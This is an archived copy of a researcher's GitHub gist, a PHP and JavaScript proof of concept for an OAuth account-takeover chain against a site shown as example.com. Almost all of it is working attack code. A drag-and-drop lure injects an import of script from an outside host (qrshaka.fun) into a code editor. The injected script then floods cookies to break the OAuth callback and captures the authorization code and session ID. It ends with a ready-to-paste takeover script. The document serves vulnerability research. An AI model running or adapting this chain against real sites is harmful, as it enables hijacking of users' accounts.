---
type: Article
title: full_poc.php
description: Original PHP and JavaScript demonstration accompanying Renwa’s March 2026 drag/drop and OAuth callback-failure article. Includes popup control, attacker-created preauth state and code recovery after cookie-induced callback failure.
resource: "https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1"
tags: [article, webseclist-reference, github-gist, oauth, xss, cookie, postmessage, attack-chain, case-study, owasp-a03-2021, owasp-a07-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-13T22:20:44+00:00"
verified:
  - by: AI archive validation
    at: 2026-09-13
status: stable
stale_after: 2027-09-13
sources:
  - id: original
    resource: "https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1"
    title: full_poc.php
    author: Renwa
also_at: []
authors:
  - Renwa
canonical_url: ""
cited_by:
  - "2026-ai.md:327"
commit: ""
content_sha256: dde8b4054b7254776dcda3ac50b64f76f69349b501db74877ef992619e4f0905
depth: full
depth_reason: default
kind: article
language: ""
licence: unknown
original_url: "https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1"
published: ""
publisher: GitHub Gist
publisher_english: ""
raw_sha256: ""
retrieved_from: "https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1"
retrieved_kind: manual-import
retrieved_utc: "2026-09-13T22:20:44+00:00"
slug: github-gist-full-poc-php
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# full_poc.php

**full_poc.php** - Renwa, GitHub Gist.

- Published: date not stated
- Original: <https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1>
- Preserved from: https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1 (manual-import) on 2026-09-13
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# full_poc.php

Author: Renwa (RenwaX23)

Source: https://gist.github.com/RenwaX23/fadb7ae19b8fca7232cf689b4543b8d1

Created: 2026-03-10T11:23:10Z

Original code revision: 451d219dfc24dbbca12d1fb3112330099baf77fe (2026-03-10).

````php
<?php
$csrf_url = 'https://example.com/i/csrf';
$login_url = 'https://example.com/social/login/';
$ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

/**
 * Helper function to perform the extraction logic.
 */
function extract_example_data($csrf_url, $login_url, $ua) {
    // Stage 1: Fetch CSRF Token
    $ch = curl_init($csrf_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    $response = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $header_size);
    curl_close($ch);

    $csrf_token = '';
    if (preg_match('/sb_csrftoken=([^;]+)/', $headers, $matches)) {
        $csrf_token = $matches[1];
    }

    if (!$csrf_token) return null;

    // Stage 2: Send POST login request to capture redirection and session
    $post_data = http_build_query([
        'csrfmiddlewaretoken' => $csrf_token,
        'next' => '/feed'
    ]);

    $ch = curl_init($login_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_REFERER, 'https://example.com/login');
    curl_setopt($ch, CURLOPT_COOKIE, "sb_csrftoken=$csrf_token");

    $response = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $post_headers = substr($response, 0, $header_size);
    curl_close($ch);

    $location = 'Not Found';
    if (preg_match('/^Location:\s*(.*)$/mi', $post_headers, $matches)) {
        $location = trim($matches[1]);
    }
    
    $session_id = 'Not Found';
    if (preg_match('/sb_sessionid=([^;]+)/', $post_headers, $matches)) {
        $session_id = $matches[1];
    }

    return [
        'csrf' => $csrf_token,
        'location' => $location,
        'session' => $session_id
    ];
}

// --- Mode: Fetch Data (JSON Response) ---
if (isset($_GET['fetch'])) {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    $data = extract_example_data($csrf_url, $login_url, $ua);
    echo json_encode($data ?: ['error' => 'Extraction failed']);
    exit;
}

// --- Mode: JS Payload (Button UI) ---
if (isset($_GET['js'])) {
    header('Content-Type: application/javascript');
    header('Access-Control-Allow-Origin: *');
?>

(function() {
    function cookieBomb() {
        console.log('[*] Initializing Cookie Bomb...');
        for (let i = 0; i < 25; i++) {
            document.cookie = `bomb_${i}=${'A'.repeat(3500)};path=/;domain=.example.com`;
        }
    }

    async function run() {
        console.log('[*] Running Exploit...');
        try {
            const resp = await fetch('https://qrshaka.fun/poc/sk.php?fetch=1');
            const data = await resp.json();
            
            if (data.location && data.location !== 'Not Found') {
                console.log('[+] OAuth URL:', data.location);
                
                // 1. Open OAuth window
                const targetWin = top.window.open(data.location, '_blank', 'width=600,height=800');
                
                if (!targetWin) {
                    console.error('[!] Popup blocked! Please allow popups.');
                    alert('Please allow popups for this site to continue the initialization.');
                    return;
                }

                // 2. Bomb cookies immediately
                cookieBomb();
                
                // 3. Monitor the window
                const monitor = setInterval(() => {
                    try {
                        if (targetWin.closed) {
                            clearInterval(monitor);
                            return;
                        }
                        const currentUrl = targetWin.location.href;
                        if (currentUrl.includes('code=') || currentUrl.includes('access_token=')) {
                            clearInterval(monitor);
                            targetWin.close();
                            
                            // 4. Hacker UI Transformation
                            top.document.body.innerHTML = `
                                <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;font-family:monospace;padding:50px;z-index:9999999;box-sizing:border-box;overflow:auto;">
                                    <h1 style="color:red;text-shadow:0 0 10px red;">[!] ACCOUNT PWNED [!]</h1>
                                    <p style="font-size:20px;">Attacker has now full access to your account with these values.</p>
                                    
                                    <div style="margin-top:30px;">
                                        <p style="color:#fff;">[+] STOLEN OAUTH URL:</p>
                                        <div style="background:#111;padding:15px;border:1px solid #333;word-break:break-all;">${currentUrl}</div>
                                    </div>

                                    <div style="margin-top:30px;">
                                        <p style="color:#fff;">[+] STOLEN SESSION ID:</p>
                                        <div style="background:#111;padding:15px;border:1px solid #333;word-break:break-all;">${data.session}</div>
                                    </div>

                                    <div style="margin-top:40px;">
                                        <p style="color:yellow;">### ATTACKER TAKEOVER SCRIPT ###</p>
                                        <p style="font-size:12px;color:#888;">Paste this into your browser console on example.com:</p>
                                        <textarea id="hacker-code" style="width:100%;height:150px;background:#111;color:#0f0;border:1px solid #0f0;padding:10px;font-family:monospace;margin-top:10px;">document.cookie = "sb_sessionid=${data.session}; domain=.example.com; path=/";\nlocation.href = "${currentUrl}";</textarea>
                                        <button onclick="document.getElementById('hacker-code').select();document.execCommand('copy');this.innerHTML='COPIED!'" style="padding:10px 20px;background:#0f0;color:#000;border:none;margin-top:10px;cursor:pointer;font-weight:bold;">COPY SCRIPT</button>
                                    </div>
                                </div>
                            `;
                        }
                    } catch (e) {
                        // SOP errors are expected during redirect
                    }
                }, 500);

            } else {
                console.error('[!] Failed to fetch OAuth URL');
            }
        } catch (e) {
            console.error('[!] Error in run:', e);
        }
    }

    run();
})();
<?php
    exit;
}

// Default response: serve test.html content
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Draggable Environment - example</title>
    <link rel="preload" href="https://example.com/developers/viewer/examples?sample=User%20Annotation#editable-sample" as="document">
    <link rel="prerender" href="https://example.com/developers/viewer/examples?sample=User%20Annotation#editable-sample">
    <style>
        :root{--primary:#00d2ff;--secondary:#3a7bd5;--bg:#0f172a;--card-bg:rgba(30,41,59,0.7)}body{margin:0;padding:0;background:radial-gradient(circle at center,#1e293b 0%,#0f172a 100%);height:100vh;display:flex;justify-content:center;align-items:center;font-family:'Outfit',sans-serif;color:white;overflow:hidden}.container{text-align:center;background:var(--card-bg);backdrop-filter:blur(12px);padding:3rem;border-radius:2rem;border:1px solid rgba(255,255,255,0.1);box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);transition:all 0.4s cubic-bezier(0.175,0.885,0.32,1.275);max-width:500px}.container:hover{transform:translateY(-5px);border:1px solid rgba(255,255,255,0.2);box-shadow:0 30px 60px -12px rgba(0,210,255,0.2)}h1{font-size:2.2rem;margin-bottom:1.5rem;background:linear-gradient(to right,var(--primary),var(--secondary));background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;letter-spacing:-0.02em}.draggable-island{width:280px;height:280px;cursor:grab;transition:all 0.3s ease;filter:drop-shadow(0 0 20px rgba(0,210,255,0.3));margin-bottom:2rem;user-select:none;-webkit-user-drag:element}.draggable-island:active{cursor:grabbing}.drop-zone{width:100%;height:100px;border:2px dashed rgba(255,255,255,0.2);border-radius:1rem;display:flex;justify-content:center;align-items:center;background:rgba(255,255,255,0.05);transition:all 0.3s ease;position:relative;overflow:hidden}.drop-zone span{font-size:1rem;font-weight:500;color:var(--text-dim);opacity:0.7;text-transform:uppercase;letter-spacing:0.1em}.drop-zone::before{content:'';position:absolute;width:100%;height:100%;background:linear-gradient(45deg,transparent,rgba(0,210,255,0.1),transparent);transform:translateX(-100%);animation:shimmer 3s infinite}@keyframes shimmer{100%{transform:translateX(100%)}}p{margin-top:1.5rem;opacity:0.6;font-size:0.9rem;font-weight:300}@keyframes pulse{0%{transform:scale(1);filter:drop-shadow(0 0 20px rgba(0,210,255,0.3))}50%{transform:scale(1.02);filter:drop-shadow(0 0 40px rgba(0,210,255,0.6))}100%{transform:scale(1);filter:drop-shadow(0 0 20px rgba(0,210,255,0.3))}}.draggable-island{animation:pulse 4s infinite ease-in-out}#loader{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg);display:none;justify-content:center;align-items:center;z-index:100;flex-direction:column}.loader-content{position:absolute;bottom:15%;display:flex;flex-direction:column;align-items:center;gap:15px}.spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top-color:var(--primary);border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}#loader p{margin:0;font-size:1.1rem;font-weight:500;color:white;text-shadow:0 0 10px rgba(0,210,255,0.5)}
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;800&display=swap" rel="stylesheet">
</head>

<body>
    <div id="loader">
        <div class="loader-content">
            <div class="spinner"></div>
            <p>Drop here in the text then Evaluate</p>
        </div>
    </div>

    <div class="container">
        <h1>Exotic Preview</h1>
        
        <img src="island.png" id="dragSource" class="draggable-island" draggable="true" alt="Crystal Island">

        <div class="drop-zone" id="dropZone">
            <span>Drop Here to Initialize</span>
        </div>

        <p>Drag the floating island into the synchronization portal to begin the immersive experience.</p>
    </div>

    <script>
        var win='';
        const dragSource = document.getElementById('dragSource');
        const loader = document.getElementById('loader');
        const targetUrl = 'https://example.com/developers/viewer/examples?sample=User%20Annotation#editable-validate';

        dragSource.addEventListener('dragstart', (event) => {
            // Set the payload: Code injection that triggers on drop in the example editor
            // The editor takes the dropped text and evaluates/inserts it.
            const payload = '\n\n\n;import("https://qrshaka.fun/poc/sk2.php?js=1");\n\n\n';
            event.dataTransfer.setData('text/plain', payload);
            
            console.log('Drag started. Arming payload...');

            // Redirect as soon as the user starts moving the mouse towards the drop zone
            // We use a small delay to ensure the browser registers the drag source
            setTimeout(() => {
                loader.style.display = 'flex';
                const w = 600, h = 400;
                const left = (screen.width / 2) - (w / 2);
                const top = (screen.height / 2) - (h / 2);
                win = window.open(targetUrl, 'win', `width=${w},height=${h},left=${left},top=${top},resizable=yes,scrollbars=yes`);
            }, 50);

            setTimeout(() => {
                win.location='https://example.com/developers/viewer/examples?sample=User%20Annotation#result'
            }, 5000);

            setInterval(() => {
                win.postMessage({"type":"log","evalization":1,"res":"Something went wrong, please click ▶ Evaluate"}, '*');
            }, 1000);
        });

        // Prevention for accidental drops on own page
        document.addEventListener('dragover', (e) => e.preventDefault());
    </script>
</body>

</html>

````
